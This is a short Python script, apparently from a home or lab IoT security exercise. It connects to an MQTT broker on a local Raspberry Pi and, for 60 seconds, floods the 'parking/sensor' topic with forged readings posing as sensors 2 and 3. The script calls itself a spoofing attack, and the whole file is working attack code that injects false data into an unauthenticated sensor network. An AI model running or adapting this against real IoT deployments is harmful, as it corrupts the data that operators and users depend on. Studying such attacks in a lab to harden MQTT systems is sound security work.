import paho.mqtt.client as mqtt
import time

# Update this to your Pi’s IP
BROKER = "10.0.0.165"
TOPIC = "parking/sensor"
SPOOFED_SENSORS = [2, 3]
ATTACK_DURATION = 60  # seconds

client = mqtt.Client()
client.connect(BROKER, 1883, 60)

print(f"[+] Starting spoofing attack for {ATTACK_DURATION} seconds...")

start_time = time.time()
while time.time() - start_time < ATTACK_DURATION:
    for sensor_id in SPOOFED_SENSORS:
        message = f"{sensor_id},Spoofed Message"
        client.publish(TOPIC, message)
        print(f"[Spoofed] Sensor {sensor_id}: Spoofed Message")
        time.sleep(0.5)  # Spread the messages

print("[+] Spoofing attack complete.")
